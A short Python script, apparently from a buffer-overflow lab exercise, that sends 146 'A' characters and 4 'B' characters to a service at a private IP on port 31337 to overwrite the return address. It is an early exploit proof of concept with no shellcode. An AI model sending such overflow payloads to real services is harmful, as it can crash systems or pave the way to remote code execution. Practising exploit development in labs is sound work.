#!/usr/bin/python
import socket
import time

ip = "172.16.32.128"
port = 31337

buf = "A" * 146
buf += "B" * 4

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((ip, port))
   time.sleep(1)
   s.send(buf + "\n");
   s.close()

except Exception as e:
   print(e)
